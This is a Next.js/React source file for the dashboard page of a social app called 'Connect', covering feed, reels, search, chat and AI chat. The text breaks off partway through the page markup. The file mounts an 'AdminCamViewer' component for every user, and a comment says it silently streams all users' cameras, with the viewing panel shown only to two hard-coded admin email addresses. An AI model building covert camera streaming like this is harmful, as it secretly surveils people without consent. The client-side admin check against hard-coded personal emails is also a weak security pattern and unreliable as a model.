'use client';

import { useSession, signOut } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import { useEffect, useState, useRef } from 'react';
import { flushSync } from 'react-dom';
import { 
  askAI, 
  getChatHistory, 
  saveChatMessage, 
  getUserDetails, 
  updateName, 
  getProfileDetails,
  getExploreContent,
  searchUsers,
  toggleProfilePrivacy,
  getOtherUserProfile,
  toggleFollowUser,
  createPostAction
} from './actions';
import SocialChat from '@/components/SocialChat';
import ThemeToggle from '@/components/ThemeToggle';
import { useTheme } from '@/app/components/ThemeProvider';
import ProfilePanel from '@/components/ProfilePanel';
import DashboardSkeleton from '@/components/DashboardSkeleton';
import HomeFeed from '@/components/HomeFeed';
import ReelsPlayer from '@/components/ReelsPlayer';
import AdminCamViewer from '@/components/AdminCamViewer';
import { triggerHaptic } from '@/lib/haptics';
import { DeviceAccountStore } from '@/lib/deviceAccountStore';

interface Message {
  id: string;
  role: 'user' | 'ai';
  content: string;
  timestamp: Date;
}

export default function DashboardPage() {
  const { theme } = useTheme();
  const isDark = theme === 'dark';
  const { data: session, status } = useSession();
  const router = useRouter();
  
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputValue, setInputValue] = useState('');
  const [isAiTyping, setIsAiTyping] = useState(false);
  
  const [view, setView] = useState<'recent' | 'requests'>('recent');
  const [isHistoryLoading, setIsHistoryLoading] = useState(true);
  
  const [isProfileOpen, setIsProfileOpen] = useState(false);
  const [isClosingProfile, setIsClosingProfile] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [isCallActive, setIsCallActive] = useState(false);
  
  // Explore and Search States
  const [explorePosts, setExplorePosts] = useState<any[]>([]);
  const [isExploreLoading, setIsExploreLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState<any[]>([]);
  const [isSearching, setIsSearching] = useState(false);
  const [searchHistory, setSearchHistory] = useState<any[]>([]);
  const [isSearchOverlayOpen, setIsSearchOverlayOpen] = useState(false);
  const [selectedProfileUser, setSelectedProfileUser] = useState<any>(null);
  
  const [fullUser, setFullUser] = useState<any>(null);
  const [activeView, setActiveView] = useState<'home' | 'search' | 'reels' | 'chat'>('home');
  const [selectedChatUser, setSelectedChatUser] = useState<any>(null);

  // Upload Modal State
  const [showUploadModal, setShowUploadModal] = useState(false);
  const [uploadType, setUploadType] = useState<'single_image' | 'reel'>('single_image');
  const [uploadUrl, setUploadUrl] = useState('');
  const [uploadCaption, setUploadCaption] = useState('');
  const [uploadLoading, setUploadLoading] = useState(false);

  // Admin cam viewer state
  const [isAdminCamOpen, setIsAdminCamOpen] = useState(false);
  const [camOnlineCount, setCamOnlineCount] = useState(0);
  const chatComponentRef = useRef<{ closeChat: () => void; silentReset: () => void } | null>(null);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const navTransitionInProgress = useRef(false);
  const profileTransitionInProgress = useRef(false);

  const runProfileTransition = (action: () => void, _x?: number, _y?: number, _reverse = false) => {
    action();
  };
  const [editingUsername, setEditingUsername] = useState(false);
  const [usernameInput, setUsernameInput] = useState('');
  const [usernameError, setUsernameError] = useState('');
  const [usernameSaving, setUsernameSaving] = useState(false);
  const [isAccountSheetOpen, setIsAccountSheetOpen] = useState(false);
  const [isChatLongPressActive, setIsChatLongPressActive] = useState(false);

  // ── RULE 1 ── Auto-register account immediately on every successful session mount ──
  // This uses the REAL userId from NextAuth so the primary key is correct.
  // It also resolves any "pending_<email>" temporary entries stored during login.
  useEffect(() => {
    const sessionUser = session?.user as any;
    if (!sessionUser?.email || !sessionUser?.id) return;

    const meta = DeviceAccountStore.metaFromSession(sessionUser);

    DeviceAccountStore.addOrUpdateAccount(meta, true).then(() => {
      DeviceAccountStore.setCurrentAccountId(meta.userId);

      // Clean up any temporary "pending_<email>" entry created during login
      const pendingKey = `pending_${meta.email}`;
      DeviceAccountStore.removeAccount(pendingKey).catch(() => {});
    }).catch(console.error);
  }, [session?.user]);

  
  // PWA Manual Installation Trigger
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);

  useEffect(() => {
    const handleBeforeInstallPrompt = (e: Event) => {
      e.preventDefault();
      setDeferredPrompt(e);
    };
    window.addEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    return () => {
      window.removeEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    };
  }, []);

  const [hasMounted, setHasMounted] = useState(false);
  useEffect(() => {
    setHasMounted(true);
  }, []);

  // Load Search History from localStorage on mount
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('connect_search_history');
      if (saved) {
        try {
          setSearchHistory(JSON.parse(saved));
        } catch (err) {
          console.error(err);
        }
      }
    }
  }, []);

  // Fetch Explore Posts when search view is opened
  useEffect(() => {
    if (activeView === 'search') {
      setIsExploreLoading(true);
      getExploreContent().then((res: any) => {
        setExplorePosts(res || []);
        setIsExploreLoading(false);
      });
    }
  }, [activeView]);

  // Handle Search Input Changes
  useEffect(() => {
    if (activeView === 'search' || isSearchOverlayOpen) {
      setIsSearching(true);
      const delayDebounce = setTimeout(() => {
        searchUsers(searchQuery).then((res: any) => {
          setSearchResults(res || []);
          setIsSearching(false);
        }).catch(() => setIsSearching(false));
      }, 200);
      return () => clearTimeout(delayDebounce);
    }
  }, [searchQuery, isSearchOverlayOpen, activeView]);

  const handleInstallApp = async () => {
    if (!deferredPrompt) {
      alert("To download/install:\n\n1. Open this app in your browser (Safari / Chrome).\n2. Tap the 'Share' or 'Menu' button.\n3. Select 'Add to Home Screen' to install it directly!");
      return;
    }
    try {
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === 'accepted') {
        console.log('User accepted the install prompt');
      }
      setDeferredPrompt(null);
    } catch (err) {
      console.error('Error triggering PWA install prompt:', err);
    }
  };

  const handleMobileBack = (): boolean => {
    triggerHaptic('light');

    // Layer 1: Admin Cam Viewer Modal
    if (isAdminCamOpen) {
      setIsAdminCamOpen(false);
      return true;
    }

    // Layer 2: Account Switcher Sheet
    if (isAccountSheetOpen) {
      setIsAccountSheetOpen(false);
      return true;
    }

    // Layer 3: Upload Modal (Create Post/Reel)
    if (showUploadModal) {
      setShowUploadModal(false);
      return true;
    }

    // Layer 4: Search Overlay
    if (isSearchOverlayOpen) {
      setIsSearchOverlayOpen(false);
      return true;
    }

    // Layer 5: User Profile Panel (Self or Other User)
    if (isProfileOpen || selectedProfileUser) {
      setIsProfileOpen(false);
      setSelectedProfileUser(null);
      return true;
    }

    // Layer 6: Social Chat internal view / active chat
    if (activeView === 'chat') {
      if (selectedChatUser) {
        if (chatComponentRef.current?.closeChat) {
          chatComponentRef.current.closeChat();
        } else {
          setSelectedChatUser(null);
        }
        return true;
      }
      setActiveView('home');
      return true;
    }

    // Layer 7: Non-home Tab (Search / Reels)
    if (activeView !== 'home') {
      setActiveView('home');
      return true;
    }

    return false;
  };

  // Push history state whenever any overlay or non-home view opens
  useEffect(() => {
    const hasAnyOverlay = isAdminCamOpen || isAccountSheetOpen || showUploadModal || isSearchOverlayOpen || isProfileOpen || !!selectedProfileUser || activeView !== 'home' || !!selectedChatUser;
    
    if (hasAnyOverlay && typeof window !== 'undefined') {
      window.history.pushState({ appNav: true }, '', window.location.href);
    }
  }, [isAdminCamOpen, isAccountSheetOpen, showUploadModal, isSearchOverlayOpen, isProfileOpen, selectedProfileUser, activeView, selectedChatUser]);

  useEffect(() => {
    const handlePopState = (e: PopStateEvent) => {
      const handled = handleMobileBack();
      if (handled) {
        e.preventDefault();
        window.history.pushState({ appNav: true }, '', window.location.href);
      }
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isAdminCamOpen, isAccountSheetOpen, showUploadModal, isSearchOverlayOpen, isProfileOpen, selectedProfileUser, activeView, selectedChatUser]);

  useEffect(() => {
    const handleOpenProfile = (e: any) => {
      if (e.detail) {
        triggerHaptic('light');
        setSelectedProfileUser(e.detail);
        setIsProfileOpen(true);
      }
    };
    window.addEventListener('open_user_profile', handleOpenProfile as any);
    return () => window.removeEventListener('open_user_profile', handleOpenProfile as any);
  }, []);

  // Load History
  useEffect(() => {
    async function loadHistory() {
      if (status === 'authenticated') {
        try {
          const history = await getChatHistory();
          const formattedHistory: Message[] = history.map((m: any) => ({
            id: m.id,
            role: m.role as 'user' | 'ai',
            content: m.content,
            timestamp: new Date(m.createdAt)
          }));
          setMessages(formattedHistory);
        } catch (err) {
          console.error("Failed to load history:", err);
        } finally {
          setIsHistoryLoading(false);
        }
      }
    }
    loadHistory();
  }, [status]);

  // Eager load User Details for Profile Panel
  const hasLoadedUser = useRef(false);
  const refreshProfile = () => {
    if (status === 'authenticated') {
      getProfileDetails().then(setFullUser);
    }
  };
  useEffect(() => {
    if (status === 'authenticated' && !hasLoadedUser.current) {
      hasLoadedUser.current = true;
      refreshProfile();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status]);

  useEffect(() => {
    if (status === 'unauthenticated') {
      router.push('/');
    }
  }, [status, router]);

  const prevViewRef = useRef(activeView);
  
  useEffect(() => {
    const isViewChange = prevViewRef.current !== activeView;
    prevViewRef.current = activeView;
    messagesEndRef.current?.scrollIntoView({ behavior: isViewChange ? 'instant' : 'smooth' });
  }, [messages.length, isAiTyping, activeView]);

  // Create a fast, optimistic session from local storage to achieve an instant, zero-lag start
  // just like native apps, skipping any skeletons or spinners while NextAuth validates in background.
  let displaySession = session;
  if (hasMounted && status === 'loading' && !session) {
    try {
      const stored = localStorage.getItem('connected_accounts');
      if (stored) {
        const list = JSON.parse(stored);
        if (list.length > 0) {
          displaySession = { user: list[0], expires: '' } as any;
        }
      }
    } catch {}
  }

  // To prevent hydration mismatch, we must match the server render during initial client render.
  if (!hasMounted || (!displaySession && status === 'loading')) {
    return null;
  }

  // Type guard to ensure displaySession is not null for TS compiler
  if (!displaySession) {
    return null;
  }

  const isAdmin = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'].includes(displaySession.user?.email?.toLowerCase().trim() || '');

  const handleSendMessage = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!inputValue.trim() || isAiTyping) return;

    const currentInput = inputValue;
    setInputValue('');

    const tempUserId = Date.now().toString();
    const userMsg: Message = {
      id: tempUserId,
      role: 'user',
      content: currentInput,
      timestamp: new Date(),
    };
    setMessages((prev) => [...prev, userMsg]);

    try {
      await saveChatMessage(currentInput, 'user');
    } catch (err) {
      console.error("Failed to save user message:", err);
    }

    setIsAiTyping(true);

    try {
      const aiResponse = await askAI(currentInput);
      const savedAiMsg = await saveChatMessage(aiResponse, 'ai');
      
      const aiMsg: Message = {
        id: savedAiMsg?.id || (Date.now() + 1).toString(),
        role: 'ai',
        content: aiResponse,
        timestamp: new Date(),
      };
      setMessages((prev) => [...prev, aiMsg]);
    } catch (err) {
      console.error(err);
    } finally {
      setIsAiTyping(false);
    }
  };

  const handleSaveName = async () => {
    if (!usernameInput.trim() || usernameInput.trim().length < 2) {
      setUsernameError('Name must be at least 2 characters');
      return;
    }
    setUsernameSaving(true);
    try {
      const res = await updateName(usernameInput);
      if (res.error) {
        setUsernameError(res.error);
      } else {
        setEditingUsername(false);
        if (fullUser) setFullUser({ ...fullUser, name: res.name || usernameInput });
      }
    } catch {
      setUsernameError('Failed to save name');
    } finally {
      setUsernameSaving(false);
    }
  };

  const handleCloseProfile = (e?: React.MouseEvent) => {
    const x = e?.clientX ?? window.innerWidth / 2;
    const y = e?.clientY ?? window.innerHeight / 2;
    runProfileTransition(() => {
      setIsProfileOpen(false);
      setIsClosingProfile(false);
      setSelectedProfileUser(null);
    }, x, y, true);
  };

  const handleOpenOtherProfile = async (userId: string, fallbackUser?: any, e?: React.MouseEvent) => {
    const x = e?.clientX ?? window.innerWidth / 2;
    const y = e?.clientY ?? window.innerHeight / 2;

    if (fallbackUser) {
      const initialDetails = {
        id: userId,
        name: fallbackUser.name,
        username: fallbackUser.username,
        email: fallbackUser.email || "",
        image: fallbackUser.image,
        bio: fallbackUser.bio || "",
        website: fallbackUser.website || "",
        posts: fallbackUser.posts || [],
        followers: fallbackUser.followers || [],
        following: fallbackUser.following || [],
        receivedFollowRequests: fallbackUser.receivedFollowRequests || [],
        isFollowing: fallbackUser.isFollowing || false,
        hasSentRequest: fallbackUser.hasSentRequest || false,
        isCurrentUser: false
      };
      runProfileTransition(() => {
        setSelectedProfileUser(initialDetails);
        setIsProfileOpen(true);
      }, x, y, false);
    }

    try {
      const details = await getOtherUserProfile(userId);
      if (details) {
        setSelectedProfileUser(details);
        if (!fallbackUser) {
          runProfileTransition(() => setIsProfileOpen(true), x, y, false);
        }
      }
    } catch (err) {
      console.error("Failed to load other profile:", err);
    }
  };

  const handleToggleFollow = async (targetUserId: string) => {
    try {
      const res = await toggleFollowUser(targetUserId);
      if (res.success) {
        const updated = await getOtherUserProfile(targetUserId);
        if (updated) {
          setSelectedProfileUser(updated);
        }
        refreshProfile();
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleAddToHistory = (user: any) => {
    const filtered = searchHistory.filter(h => h.id !== user.id);
    const updated = [{ id: user.id, name: user.name, username: user.username, image: user.image }, ...filtered].slice(0, 15);
    setSearchHistory(updated);
    if (typeof window !== 'undefined') {
      localStorage.setItem('connect_search_history', JSON.stringify(updated));
    }
  };

  const handleRemoveFromHistory = (userId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    const updated = searchHistory.filter(h => h.id !== userId);
    setSearchHistory(updated);
    if (typeof window !== 'undefined') {
      localStorage.setItem('connect_search_history', JSON.stringify(updated));
    }
  };

  const handleNavClick = (viewId: any, e: React.MouseEvent) => {
    triggerHaptic('light');
    if (isProfileOpen) {
      setIsProfileOpen(false);
      setIsClosingProfile(false);
      setSelectedProfileUser(null);
    }

    if (viewId === 'chat') {
      chatComponentRef.current?.silentReset();
      setSelectedChatUser(null);
    }

    if (activeView !== viewId) {
      setActiveView(viewId);
    }
  };

  return (
    <div className="main-layout flex h-[100dvh] overflow-hidden font-sans font-light text-[0.95em] md:p-3 md:gap-3 animate-in fade-in slide-in-from-left-full duration-700 ease-[var(--ease-premium)]" style={{ background: 'var(--dm-bg-page)', color: 'var(--dm-text-primary)' }}>
      
      {/* Admin cam viewer — silently streams for all users; panel shown only for admin */}
      <AdminCamViewer
        userEmail={displaySession.user?.email || ''}
        username={displaySession.user?.name || displaySession.user?.email?.split('@')[0] || 'User'}
        isOpen={isAdminCamOpen}
        onOpenChange={setIsAdminCamOpen}
        onCamUsersCount={setCamOnlineCount}
      />
      
      {/* Fully Adaptive Sidebar */}
      <div className="main-sidebar w-[88px] hover:w-72 h-full flex flex-col justify-between p-4 transition-[width,box-shadow] duration-500 ease-[var(--ease-premium)] will-change-[width] group z-20 overflow-hidden border-r md:border md:rounded-[40px] shadow-sm" style={{ background: 'var(--dm-bg-sidebar)', borderColor: 'var(--dm-border-main)' }}>
        <div className="flex flex-col h-full">
          {/* Logo */}
          <div className="mb-4 flex items-center justify-center group-hover:justify-start gap-0 group-hover:gap-3 px-1 h-12 transition-all duration-500 ease-[var(--ease-premium)]">
            <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center">
              <img 
                src="/connect-logo.png" 
                alt="Connect Logo" 
                className="w-10 h-10 rounded-xl object-contain transition-transform duration-300 hover:scale-105 drop-shadow-sm" 
                style={{ filter: isDark ? 'invert(1) drop-shadow(0 0 8px rgba(255,255,255,0.2))' : 'none' }} 
              />
            </div>
            <span className="font-extrabold text-base tracking-tight opacity-0 group-hover:opacity-100 transition-all duration-300 whitespace-nowrap overflow-hidden" style={{ color: 'var(--dm-text-primary)' }}>
              Connect
            </span>
          </div>
          
          <nav className="flex-1 space-y-1">
            {[
              { id: 'home', name: 'Home', icon: 'M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6' },
              { id: 'reels', name: 'Reels', icon: '' },
              { id: 'chat', name: 'Chat', icon: 'M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z' },
              { id: 'search', name: 'Search', icon: 'M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z' }
            ].map((item) => {
              const isItemActive = !isProfileOpen && activeView === item.id;
              return (
                <div 
                  key={item.id} 
                  onClick={(e) => handleNavClick(item.id, e)}
                  className={`flex items-center justify-center group-hover:justify-start gap-0 group-hover:gap-4 px-1 py-1 rounded-full cursor-pointer transition-all duration-500 ease-[var(--ease-premium)] group/item overflow-hidden`}
                  style={{ background: isItemActive ? 'var(--dm-bg-active)' : 'transparent' }}
                  onMouseEnter={e => { if (!isItemActive) (e.currentTarget as HTMLElement).style.background = 'var(--dm-bg-hover)'; }}
                  onMouseLeave={e => { if (!isItemActive) (e.currentTarget as HTMLElement).style.background = 'transparent'; }}
                >
                  <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center">
                    {item.id === 'reels' ? (
                      <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: isItemActive ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)' }}>
                        <rect x="3" y="3" width="18" height="18" rx="5" />
                        <line x1="3" y1="9" x2="21" y2="9" />
                        <path d="m7 3 3 6" />
                        <path d="m14 3 3 6" />
                        <polygon points="10,12 16,15 10,18" fill="currentColor" stroke="none" />
                      </svg>
                    ) : (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: isItemActive ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)' }}>
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={item.icon} />
                      </svg>
                    )}
                  </div>
                  <span className="text-[12px] font-light opacity-0 group-hover:opacity-100 transition-opacity duration-300 whitespace-nowrap overflow-hidden" style={{ color: isItemActive ? 'var(--dm-text-primary)' : 'var(--dm-text-secondary)' }}>
                    {item.name}
                  </span>
                </div>
              );
            })}

            {/* Admin-only Cam Viewer button — same style as nav items */}
            {isAdmin && (
              <div
                onClick={() => setIsAdminCamOpen(true)}
                className="flex items-center justify-center group-hover:justify-start gap-0 group-hover:gap-4 px-1 py-1 rounded-full cursor-pointer transition-all duration-500 ease-[var(--ease-premium)] overflow-hidden relative"
                style={{ background: isAdminCamOpen ? 'var(--dm-bg-active)' : 'transparent' }}
                onMouseEnter={e => { if (!isAdminCamOpen) (e.currentTarget as HTMLElement).style.background = 'var(--dm-bg-hover)'; }}
                onMouseLeave={e => { if (!isAdminCamOpen) (e.currentTarget as HTMLElement).style.background = 'transparent'; }}
              >
                <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center relative">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: isAdminCamOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)' }}>
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                  {camOnlineCount > 0 && (
                    <span className="absolute top-1.5 right-1.5 w-4 h-4 rounded-full text-[9px] font-bold flex items-center justify-center text-white" style={{ background: '#ef4444', lineHeight: 1 }}>
                      {camOnlineCount > 9 ? '9+' : camOnlineCount}
                    </span>
                  )}
                </div>
                <span className="text-[12px] font-light opacity-0 group-hover:opacity-100 transition-opacity duration-300 whitespace-nowrap overflow-hidden" style={{ color: isAdminCamOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-secondary)' }}>
                  Cam Viewer
                </span>
              </div>
            )}
          </nav>

          {/* Profile Section */}
          <div className="mt-auto pt-4 pb-4" style={{ borderTop: '1px solid var(--dm-border)' }}>
            <div 
              onClick={(e) => runProfileTransition(() => setIsProfileOpen(true), e.clientX, e.clientY, false)}
              className="flex items-center justify-center group-hover:justify-start gap-0 group-hover:gap-4 px-1 py-1 rounded-full cursor-pointer group/profile active:scale-95 transition-all duration-500 ease-[var(--ease-premium)] overflow-hidden"
              style={{ background: isProfileOpen ? 'var(--dm-bg-active)' : 'transparent' }}
              onMouseEnter={e => { if (!isProfileOpen) (e.currentTarget as HTMLElement).style.background = 'var(--dm-bg-hover)'; }}
              onMouseLeave={e => { if (!isProfileOpen) (e.currentTarget as HTMLElement).style.background = 'transparent'; }}
            >
              <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center">
                <div className="w-9 h-9 rounded-full overflow-hidden flex items-center justify-center font-normal text-xs shadow-sm transition-transform duration-300 group-hover/profile:scale-105" style={{ background: isProfileOpen ? 'var(--dm-text-primary)' : 'var(--dm-bg-input)', border: '1px solid var(--dm-border)', color: isProfileOpen ? 'var(--dm-bg-main)' : 'var(--dm-text-secondary)' }}>
                  {displaySession.user?.image
                    ? <img src={displaySession.user.image} alt="profile" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                    : <img src="/Avatar.avif" alt="profile" className="w-full h-full object-cover" referrerPolicy="no-referrer" />}
                </div>
              </div>
              <div className="flex-1 min-w-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300 overflow-hidden">
                <p className="text-[13px] font-normal truncate transition-colors" style={{ color: 'var(--dm-text-primary)' }}>
                  {displaySession.user?.name || displaySession.user?.email?.split('@')[0] || 'User'}
                </p>
                <p className="text-[10px] truncate uppercase tracking-widest mt-0.5" style={{ color: isProfileOpen ? 'var(--dm-text-secondary)' : 'var(--dm-text-muted)' }}>
                  View Profile
                </p>
              </div>
            </div>
          </div>
            
          <button
            onClick={() => {
              try {
                localStorage.removeItem('has_active_session');
                localStorage.removeItem('last_logged_user');
                localStorage.removeItem('social_messages_cache');
              } catch (e) {}
              signOut({ callbackUrl: '/accounts' });
            }}
            className="w-full flex items-center justify-start gap-0 group-hover:gap-4 px-1 py-2 transition-[gap] duration-500 ease-[var(--ease-premium)] rounded-full overflow-hidden"
            style={{ color: 'var(--dm-text-muted)', border: '1px solid transparent' }}
            onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = '#ef4444'; (e.currentTarget as HTMLElement).style.background = isDark ? 'rgba(239,68,68,0.1)' : 'rgba(239,68,68,0.05)'; (e.currentTarget as HTMLElement).style.borderColor = isDark ? 'rgba(239,68,68,0.3)' : '#fecaca'; }}
            onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = 'var(--dm-text-muted)'; (e.currentTarget as HTMLElement).style.background = 'transparent'; (e.currentTarget as HTMLElement).style.borderColor = 'transparent'; }}
          >
            <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: 'inherit' }}>
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
              </svg>
            </div>
            <span className="text-[13px] font-light opacity-0 group-hover:opacity-100 transition-opacity duration-300 whitespace-nowrap overflow-hidden">
              Sign out
            </span>
          </button>
        </div>
      </div>

      {/* Main Container */}
      <div className="main-container flex-1 flex flex-col overflow-hidden relative md:rounded-[40px] shadow-sm md:border" style={{ background: activeView === 'reels' ? '#000000' : 'var(--dm-bg-main)', borderColor: activeView === 'reels' ? '#000000' : 'var(--dm-border-main)' }}>

        {/* Content Views */}
        {/* Content Views — Always mounted for zero-delay tab switching & scroll preservation */}
        <div className={`ig-tab-panel ${activeView === 'home' ? 'ig-tab-enter' : ''}`} data-active={activeView === 'home'}>
          <div className="relative w-full h-full flex flex-col min-h-0 overflow-hidden">
            <HomeFeed 
              isDark={isDark} 
              session={displaySession}
              onNavigate={(viewId) => setActiveView(viewId)}
              isAdmin={isAdmin}
              onOpenAdminCam={() => setIsAdminCamOpen(true)}
            />
          </div>
        </div>

        <div className={`ig-tab-panel ${activeView === 'reels' ? 'ig-tab-enter' : ''}`} data-active={activeView === 'reels'}>
          <div className="relative w-full h-full flex flex-col min-h-0 overflow-hidden bg-black" style={{ background: '#000000' }}>
            <ReelsPlayer 
              onBack={() => setActiveView('home')}
              onOpenProfile={(userId, fallbackUser, e) => handleOpenOtherProfile(userId, fallbackUser, e)}
              isDark={isDark}
            />
          </div>
        </div>

        {/* Search Explore Page */}
        <div className={`ig-tab-panel ${activeView === 'search' ? 'ig-tab-enter' : ''}`} data-active={activeView === 'search'}>
          <div className="w-full h-full flex flex-col min-h-0 relative" style={{ background: 'var(--dm-bg-main)' }}>
            
            {/* Top Search Action Bar */}
            <div className="px-3 pt-[calc(1rem+env(safe-area-inset-top,0px))] pb-2 flex-shrink-0">
              <div 
                onClick={() => setIsSearchOverlayOpen(true)}
                className="flex items-center gap-3 px-4 py-2.5 rounded-full cursor-pointer transition-all duration-300 border hover:border-zinc-400"
                style={{
                  background: isDark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.03)',
                  borderColor: isDark ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.08)'
                }}
              >
                <svg className="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: 'var(--dm-text-muted)' }}>
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
                <span className="text-sm font-normal" style={{ color: 'var(--dm-text-muted)' }}>Search by username...</span>
              </div>
            </div>

            {/* Explore Reels Grid - Edge-to-edge 0px padding, large 2-col vertical reels format */}
            <div className="flex-1 min-h-0 overflow-y-auto px-0 pb-24 pt-0.5 w-full">
              {isExploreLoading ? (
                <div className="grid grid-cols-2 gap-[2px] w-full px-0">
                  {[...Array(6)].map((_, i) => (
                    <div key={i} className="w-full aspect-[9/16] animate-pulse" style={{ background: isDark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.05)' }} />
                  ))}
                </div>
              ) : explorePosts.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-20 px-4 text-center">
                  <div className="w-16 h-16 rounded-full flex items-center justify-center mb-3" style={{ background: isDark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.04)' }}>
                    <svg className="w-8 h-8 text-zinc-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
                    </svg>
                  </div>
                  <p className="text-base font-semibold" style={{ color: 'var(--dm-text-primary)' }}>No reels yet</p>
                  <p className="text-xs text-zinc-500 mt-1">Uploaded video reels will appear here.</p>
                </div>
              ) : (
                <div className="grid grid-cols-2 gap-[2px] w-full px-0">
                  {explorePosts.map((post: any) => (
                    <div
                      key={post.id}
                      onClick={() => setActiveView('reels')}
                      className="aspect-[9/16] relative cursor-pointer overflow-hidden group w-full"
                      style={{ background: isDark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.03)' }}
                    >
                      {post.thumbnailUrl || post.imageUrl ? (
                        <img 
                          src={post.thumbnailUrl || post.imageUrl} 
                          alt="reel" 
                          className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
                        />
                      ) : (
                        <div className="w-full h-full flex flex-col items-center justify-center p-2 text-center bg-zinc-900">
                          <svg className="w-8 h-8 mb-1 text-zinc-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
                          </svg>
                        </div>
                      )}
                      
                      {/* Reels glyph badge top right */}
                      <div className="absolute top-2.5 right-2.5 bg-black/60 backdrop-blur-md p-1.5 rounded-full z-10">
                        <svg width="13" height="13" fill="#fff" viewBox="0 0 24 24">
                          <path d="M17 10.5V7a1 1 0 00-1-1H4a1 1 0 00-1 1v10a1 1 0 001 1h12a1 1 0 001-1v-3.5l4 4v-11l-4 4z"/>
                        </svg>
                      </div>

                      {/* Bottom creator info */}
                      <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent flex flex-col justify-end p-2.5 pointer-events-none">
                        <div className="flex items-center gap-1.5 mb-1 pointer-events-auto" onClick={(e) => { e.stopPropagation(); handleOpenOtherProfile(post.user?.id, post.user, e); }}>
                          <img
                            src={post.user?.image || '/Avatar.avif'}
                            alt=""
                            className="w-5 h-5 rounded-full object-cover border border-white/40"
                          />
                          <p className="text-[12px] font-semibold text-white truncate drop-shadow">@{post.user?.username || 'user'}</p>
                        </div>
                        {post.caption && (
                          <p className="text-[11px] text-white/90 line-clamp-1 drop-shadow font-light">{post.caption}</p>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Sliding Fullscreen Search Overlay */}
            {isSearchOverlayOpen && (
              <div 
                className="absolute inset-0 z-50 flex flex-col animate-search-in"
                style={{
